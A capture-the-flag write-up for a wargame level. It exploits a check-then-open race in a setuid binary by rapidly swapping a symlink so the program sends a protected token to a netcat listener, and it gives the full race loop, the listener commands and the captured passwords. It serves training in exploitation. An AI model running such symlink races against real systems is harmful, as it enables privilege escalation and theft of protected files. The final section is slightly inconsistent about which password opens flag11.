# LEVEL 10

In our home directory, we have one suid/guid executable, and one token file:
```
>$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

If we run the executable, we see that it expects a file, to send it to the host:
```
>$ ./level10
./level10 file host
	sends file to host if you have access to it
```
Using strings command on the executable:
```
>$ strings level10
[..]
[^_]
%s file host
	sends file to host if you have access to it
Connecting to %s:6969 ..
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file ..
Damn. Unable to open file
Unable to read from file: %s
wrote file!
You don't have access to %s
[..]
```
In a second terminal (in our local machine) let's use **Netcat** to listen on this port (6969):
```
➜ nc 6969 -l
```
Back in the first terminal (VM machine), if we create a file and send it to local machine, it arrives in the second terminal (local one listening to port):
```
>$ echo "hi" > /tmp/hi
>$ ./level10 /tmp/hi {LOCAL_LAN_IPv4_ADDRESS}
Connecting to {LOCAL_LAN_IPv4_ADDRESS}:6969 .. Connected!
Sending file .. wrote file!
```

To access the token, we find a potential weakness in the binary's use of `access`:
```
>$ nm -u level10
	U access@@GLIBC_2.0
```
reading man of access() we found:
```
Warning:  Using  access()  to  check if a user is authorized to, for example, open a file
	before actually doing so using open(2) creates a security hole, because  the  user  might
	exploit  the  short time interval between checking and opening the file to manipulate it.
```

We open the token through a symbolic link created with another file in our HOME. which means we automate the process of creating the symbolic link and calling `./level10` with `while` in our shell:
```
>$ chmod 777 . && touch test
>$ (while true; do ln -sf test tmp; ln -sf token tmp; done)&
>$ while true; do ./level10 tmp {LOCAL_LAN_IPv4_ADDRESS}; done
```
Then when we listen:
```
➜ nc 6969 -l
woupa2yuojeeaaed06riuj63c
```
```
>$ su flag10
Password: woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
>$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

this token is also the password for user flag11:
```
>$ su flag11
Password: woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
>$ getflag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

#### Vulnerability:
Race hazard with sequenced call to an access and open -> Privilege escalation via symlink attack

#### Documentations:
* https://stackoverflow.com/questions/7925177/access-security-hole